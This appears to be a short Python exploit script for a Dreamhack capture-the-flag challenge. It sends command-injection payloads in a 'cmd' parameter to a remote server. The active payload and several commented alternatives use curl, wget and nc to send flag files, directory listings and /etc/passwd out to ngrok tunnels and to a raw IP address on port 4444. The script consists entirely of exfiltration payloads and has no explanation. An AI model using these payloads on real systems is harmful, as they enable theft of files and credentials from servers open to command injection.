import requests

url = "http://host1.dreamhack.games:13080/"
# url = "http://192.168.0.11:8000/"
data = {
    'cmd': 'curl -d "@flag.py" http://db2c-125-132-255-197.ngrok.io'
    # 'cmd': 'curl -d "ls" -X POST http://2958-125-132-255-197.ngrok.io'
    # 'cmd': 'wget –post-data exfil=`cat flag.txt`  http://2dc1-125-132-255-197.ngrok.io'
    # 'cmd': 'wget –header="evil:`cat /etc/passwd | xargs echo –n`" http://2dc1-125-132-255-197.ngrok.io'
    # 'cmd': 'nc 3.13.191.225 4444 < flag.txt'
    # 'cmd': "echo ` pwd; ls; cat flag.py` > a; curl -X POST -F 'flag=@./a' http://2958-125-132-255-197.ngrok.io"
    # 'cmd': 'ls | nc http://db2c-125-132-255-197.ngrok.io 4444'
}
r = requests.head(url,params=data)
print(r)